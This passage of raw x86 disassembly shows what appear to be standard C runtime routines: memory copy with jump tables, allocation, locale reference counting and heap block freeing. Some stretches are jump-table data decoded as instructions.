  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
